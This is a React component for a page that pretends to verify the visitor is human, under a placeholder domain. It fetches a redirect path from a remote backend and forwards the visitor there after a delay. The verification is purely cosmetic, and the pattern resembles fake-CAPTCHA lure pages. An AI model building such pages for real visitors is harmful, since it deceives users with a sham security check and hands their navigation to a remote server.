import Lottie from "lottie-react";
import { useNavigate } from "react-router-dom";
import { useEffect, useState } from "react";
import checkAnimation from "/Animation .json";
export default function VerificationPage() {
    const [play, setPlay] = useState(false);
    const navigate = useNavigate();
    useEffect(() => {
        const timer = setTimeout(() => setPlay(true), 1000);
        // begining verification fetch
        fetch('https://humanverify-backend-1.onrender.com/verify')
            .then(res => res.json())
            .then(data => {
                setTimeout(() => {
                    navigate(`/${data.redirect}`);
                }, 5000);
            })
            .catch(error => console.error('Verification failed:', error));
        return () => clearTimeout(timer);
    }, [navigate]);
    return (
        <div className="min-h-screen flex items-center justify-center  bg-gray-800 font-poppins">
            <div className="bg-white p-8  rounded shadow text-center">
                <h1 className="text-2xl font-bold mb-4 font-poppins ">www.website.com</h1>
                <div className=" border-2 border-black p-6 bg-gray-100 flex justify-center mt-8">
                    <label className="flex items-center space-x-5">
                        <div className="w-10 h-10 shadow-blue-300" checked readonly>
                            {play && <Lottie animationData={checkAnimation} loop={false} checked />}
                        </div>
                        <span className="text-gray-800 -mr-20 text-lg font-normal space-x-2 ">Verifying your Human
                        </span>
                        <img className="w-6 h-6 space-x-4" src="logo.png" alt="logo"></img></label>
                </div>
                <p className="mb-6 mt-10 text-xl ">This process is automatic.please wait!</p>
                <div className="animate-spin rounded-full h-6 w-6 border-t-2 border-b-2 border-green-500 mx-auto"></div>
            </div>
        </div>
    )
}











